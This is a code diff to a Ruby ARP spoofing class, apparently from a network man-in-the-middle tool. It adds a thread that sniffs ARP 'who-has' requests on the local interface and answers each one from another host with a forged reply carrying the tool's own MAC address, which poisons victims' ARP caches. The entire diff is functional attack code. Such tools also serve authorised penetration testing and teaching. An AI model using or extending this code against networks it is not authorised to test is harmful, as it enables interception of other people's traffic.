@@ -22,6 +22,8 @@ class ArpSpoofer < ISpoofer
     @gw_hw        = nil
     @forwarding   = @ctx.firewall.forwarding_enabled?
     @spoof_thread = nil
+    @sniff_thread = nil
+    @capture      = nil
     @running      = false
 
     Logger.debug 'ARP SPOOFER SELECTED'
@@ -60,6 +62,34 @@ class ArpSpoofer < ISpoofer
     end
 
     @running = true
+    @sniff_thread = Thread.new do
+      Logger.info 'ARP watcher started ...'
+
+      @capture = Capture.new(
+          iface: @ctx.options[:iface],
+          filter: 'arp',
+          start: true
+      )
+
+      @capture.stream.each do |p|
+        begin
+          pkt = Packet.parse p
+          # we're only interested in 'who-has' packets
+          if pkt.arp_opcode == 1 and pkt.arp_dst_mac.to_s == '00:00:00:00:00:00'
+            is_from_us = ( pkt.arp_src_ip.to_s == @ctx.ifconfig[:ip_saddr] )
+
+            if !is_from_us
+              Logger.info "[ARP] #{pkt.arp_src_ip.to_s} is asking who #{pkt.arp_dst_ip.to_s} is."
+
+              send_spoofed_packed pkt.arp_dst_ip.to_s, @ctx.ifconfig[:eth_saddr], pkt.arp_src_ip.to_s, pkt.arp_src_mac.to_s
+            end
+          end
+        rescue Exception => e
+          Logger.error e.message
+        end
+      end
+    end
+
     @spoof_thread = Thread.new do
       prev_size = @ctx.targets.size
       loop do
